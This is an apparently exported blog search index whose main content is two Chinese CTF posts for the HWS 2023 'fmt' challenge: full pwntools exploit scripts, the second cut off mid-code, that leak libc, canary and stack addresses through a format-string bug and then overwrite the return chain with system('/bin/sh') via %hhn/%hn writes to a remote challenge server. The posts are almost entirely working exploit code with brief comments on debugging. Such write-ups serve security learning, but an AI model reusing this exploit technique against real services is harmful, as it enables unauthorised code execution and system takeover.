[{"content":"","date":"July 18, 2023","permalink":"/","section":"","summary":"","title":""},{"content":"","date":"July 18, 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"July 18, 2023","permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":"","date":"July 18, 2023","permalink":"/series/hws-2023/","section":"Series","summary":"","title":"HWS 2023"},{"content":"wp如下:\n# encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 0 is_ret = 1 if is_debug: context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if is_remote == 1: taolve = remote(\u0026#34;60.204.140.184\u0026#34;, 30302) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd elif is_remote == 2: taolve = process([\u0026#34;/lib64/ld-linux-x86-64.so.2\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc.so.6\u0026#34;}) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd else: taolve = process(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) _binsh = 0x1d8698 def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elf = ELF(\u0026#39;./pwn\u0026#39;) \u0026#34;\u0026#34;\u0026#34; 1.泄露出必要的信息 (1)先泄露_IO_2_1_stderr函数的真实地址，用来计算libc的偏移地址 (2)再泄露canary，看看后面会不会用到 (3)接着泄露栈上的一个地址，用gdb调试看它与我们的ret指令地址之间的距离，计算得到ret指令的地址 (4)最后泄露栈上main函数一个指令的地址，用来计算main函数与run函数的偏移 \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;-%10$p-%17$p-%14$p-%19$p-\u0026#34; taolve.recvuntil(b\u0026#34;I need a str: \u0026#34;) taolve.sendline(payload1) taolve.recvuntil(b\u0026#34;-0x\u0026#34;) _IO_2_1_stderr_ = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) canary = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) stack_1 = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) main1 = int(taolve.recvuntil(b\u0026#34;-\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) libc_base = _IO_2_1_stderr_ - libc.sym[\u0026#39;_IO_2_1_stderr_\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] sys_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] run_base1 = main1 - elf.sym[\u0026#39;main\u0026#39;] - 28 log.success(\u0026#34;_IO_2_1_stderr_ = \u0026#34; + hex(_IO_2_1_stderr_)) log.success(\u0026#34;canary = \u0026#34; + hex(canary)) log.success(\u0026#34;stack_1 = \u0026#34; + hex(stack_1)) log.success(\u0026#34;libc_base = \u0026#34; + hex(libc_base)) log.success(\u0026#34;printf_got = \u0026#34; + hex(printf_got)) log.success(\u0026#34;system = \u0026#34; + hex(sys_addr)) log.success(\u0026#34;main1 = \u0026#34; + hex(main1)) log.success(\u0026#34;run_base1 = \u0026#34; + hex(run_base1)) \u0026#34;\u0026#34;\u0026#34; 2.跳转到main函数的开头 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;ret_2_main!!!!!!!\u0026#34;) stack_2 = stack_1 - 0x20 + 0x28 log.success(\u0026#34;stack_2 = \u0026#34; + hex(stack_2)) c = 0xd8 payload11 = b\u0026#39;%\u0026#39; + str(c).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload11 += b\u0026#39;%11$hhn\u0026#39; n4 = len(payload11) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 payload11 += b\u0026#39;a\u0026#39; * n5 payload11 += p64(stack_2) log.success(\u0026#34;ret_2_main!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) \u0026#34;\u0026#34;\u0026#34; 3.利用字符串漏洞向栈上填写system函数的地址 的前四位！！！ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;system_____前四位_______!!!!!!!\u0026#34;) sys_addr_min = hex(sys_addr) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) if is_ret == 1: shift = 24 else: shift = 16 brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + shift brr[1] = 4 + shift brr[2] = 3 + shift brr[3] = 2 + shift brr[4] = 1 + shift brr[5] = 0 + shift log.success(\u0026#34;sys_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 # 检验排序后的结果 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;system_____完成前四位_________!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 在栈上填写system后半部分： \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;system_______完成后四位_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 3.填写binsh的地址 的前四位！！！ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;binsh_____前四位_________!!!!!!!\u0026#34;) # binsh = _binsh + libc_base binsh = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() sys_addr_min = hex(binsh) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 8 brr[1] = 4 + 8 brr[2] = 3 + 8 brr[3] = 2 + 8 brr[4] = 1 + 8 brr[5] = 0 + 8 log.success(\u0026#34;binsh_addr\u0026#34; + hex(binsh)) log.success(\u0026#34;binsh_addr_min=\u0026#34; + str(sys_addr_min)) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;binsh_____完成前四位_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; binsh后半部分： \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;binsh_______完成后四位_______!!!!!!!\u0026#34;) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 4.填写ret 的地址 的前四位！！！（保证64位栈平衡） \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;ret_____前四位_________addr!!!!!!!\u0026#34;) if is_remote == 1 or is_remote == 2: pop__ret = 0x22679 + libc_base else: pop__ret = 0x29cd6 + libc_base sys_addr_min = hex(pop__ret) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 16 brr[1] = 4 + 16 brr[2] = 3 + 16 brr[3] = 2 + 16 brr[4] = 1 + 16 brr[5] = 0 + 16 log.success(\u0026#34;pop_ret_addr\u0026#34; + hex(pop__ret)) log.success(\u0026#34;pop_ret_addr_min=\u0026#34; + str(sys_addr_min)) for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;ret_____完成前四位_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; ret后半部分： \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;ret_______完成后四位_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 再来跳转一次main函数： \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 5.填写pop_rdi_ret 的地址 的前四位！！！ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;pop_rdi_ret______________addr!!!!!!!\u0026#34;) ret_rdi = 0x01453 + run_base1 sys_addr_min = hex(ret_rdi) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:6], 16) crr[1] = int(sys_addr_min[6:10], 16) crr[2] = int(sys_addr_min[10:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 4 brr[1] = 2 brr[2] = 0 log.success(\u0026#34;pop_rdi_ret_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;pop_rdi_ret_addr_min=\u0026#34; + str(sys_addr_min)) for i in range(3): for j in range(0, 3 - i - 1): if crr[j] \u0026lt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2])) payload1 += b\u0026#39;%\u0026#39; + str(crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[1]-crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(12).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[0]-crr[1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(13).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 payload1 += p64(stack_2 + brr[2]) + p64(stack_2 + brr[1]) + p64(stack_2 + brr[0]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) \u0026#34;\u0026#34;\u0026#34; 其实这道题本地很早就打通了，但是远程一直出错， 所以我在比赛时将4字节覆数据的方式改为了2字节又改为了1字节， 结果还是打不通，(悲 最后想起来还可以通过字符串来打印栈上的值来远程调试 所以就有了最后这个像打表一样的调试方法 可惜，最后做完这道题已经没有时间做别的题了(orz \u0026#34;\u0026#34;\u0026#34; taolve.recvuntil(b\u0026#34;str: \u0026#34;) pad = b\u0026#34;-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p-%23$p-%24$p-\u0026#34; taolve.sendline(pad) taolve.interactive() ","date":"July 18, 2023","permalink":"/posts/wp/2023_07_hws/fmt/","section":"Posts","summary":"wp如下: # encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 0 is_ret = 1 if is_debug: context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;)","title":"HWS 2023 fmt wp"},{"content":"比赛时的脚本：（有点乱）\n# encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 1 is_gdb = 0 is_ret = 1 is_searcher = 0 is_sleep = 0 if is_sleep == 1: sleep(1) if is_debug: context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if is_remote == 1: taolve = remote(\u0026#34;60.204.140.184\u0026#34;, 30302) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd elif is_remote == 2: taolve = process([\u0026#34;/lib64/ld-linux-x86-64.so.2\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc.so.6\u0026#34;}) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd else: taolve = process(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) _binsh = 0x1d8698 if is_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif is_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) pause() elif is_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elf = ELF(\u0026#39;./pwn\u0026#39;) \u0026#34;\u0026#34;\u0026#34; 1.泄露出必要的信息 \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;-%10$p-%17$p-%14$p-%23$p-%19$p-\u0026#34; taolve.recvuntil(b\u0026#34;I need a str: \u0026#34;) taolve.sendline(payload1) taolve.recvuntil(b\u0026#34;-0x\u0026#34;) _IO_2_1_stderr_ = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) print(hex(_IO_2_1_stderr_)) can = taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;) canary = int(can, 16) print(\u0026#34;canary = \u0026#34; + hex(canary)) stack_1 = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) if is_searcher == 1: libc = LibcSearcher(\u0026#39;_IO_2_1_stderr_\u0026#39;, _IO_2_1_stderr_) libc_base = _IO_2_1_stderr_ - libc.dump(\u0026#39;_IO_2_1_stderr_\u0026#39;) log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) sys_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # + 0x40 # 补上0x40 else: log.success(\u0026#34;stack_1 = \u0026#34; + hex(stack_1)) libc_base = _IO_2_1_stderr_ - libc.sym[\u0026#39;_IO_2_1_stderr_\u0026#39;] log.success(\u0026#34;libc_base = \u0026#34; + hex(libc_base)) printf_got = elf.got[\u0026#39;printf\u0026#39;] log.success(\u0026#34;printf_got = \u0026#34; + hex(printf_got)) sys_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] log.success(\u0026#34;system = \u0026#34; + hex(sys_addr)) libc1 = ELF(\u0026#39;./libc.so.6\u0026#39;) libc_base123 = _IO_2_1_stderr_ - libc1.sym[\u0026#39;_IO_2_1_stderr_\u0026#39;] log.success(\u0026#34;libc_base123 = \u0026#34; + hex(libc_base123)) main = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) log.success(\u0026#34;main = \u0026#34; + hex(main)) run_base = main - 0x13c6 # 第一个run_base采用的是栈上的数据来计算偏移，所以打通了本地但是没打通远程 main1 = int(taolve.recvuntil(b\u0026#34;-\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) run_base1 = main1 - elf.sym[\u0026#39;main\u0026#39;] - 28 #后来远程用打表的方式调试才发现自己用栈上的数据计算偏移是会改变的 #所以run_base1利用rbp下面的数据才可以正确地计算偏移 log.success(\u0026#34;run_base = \u0026#34; + hex(run_base)) log.success(\u0026#34;run_base1 = \u0026#34; + hex(run_base1)) # pause() # taolve.interactive() \u0026#34;\u0026#34;\u0026#34; 2.跳转到main函数的开头 \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) stack_2 = stack_1 - 0x20 + 0x28 log.success(\u0026#34;stack_2 = \u0026#34; + hex(stack_2)) main_addr = run_base + 0x137c log.success(\u0026#34;main == \u0026#34; + hex(main_addr)) c = 0xd8 payload11 = b\u0026#39;%\u0026#39; + str(c).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload11 += b\u0026#39;%11$hhn\u0026#39; n4 = len(payload11) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 payload11 += b\u0026#39;a\u0026#39; * n5 payload11 += p64(stack_2) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) \u0026#34;\u0026#34;\u0026#34; 3.利用字符串漏洞向栈上填写system函数的地址 的前四位！！！ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;system_____前四位_______addr!!!!!!!\u0026#34;) one_gadget = sys_addr sys_addr_min = hex(one_gadget) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) if is_ret == 1: shift = 24 else: shift = 16 brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + shift brr[1] = 4 + shift brr[2] = 3 + shift brr[3] = 2 + shift brr[4] = 1 + shift brr[5] = 0 + shift log.success(\u0026#34;sys_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 # 检验排序后的结果 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) 